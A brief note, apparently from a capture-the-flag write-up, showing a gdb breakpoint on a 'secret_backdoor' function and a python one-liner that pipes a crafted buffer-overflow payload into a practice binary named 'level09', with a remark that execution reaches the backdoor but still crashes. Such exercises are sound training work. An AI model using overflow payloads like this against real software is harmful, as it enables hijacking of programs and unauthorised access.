(gdb) b secret_backdoor 
Breakpoint 1 at 0x555555554890

(python -c 'print("A" * 40 + "\xca" + "\x90\x48" * 146)') | ./level09

we still crash bu we enter in secret backdoor function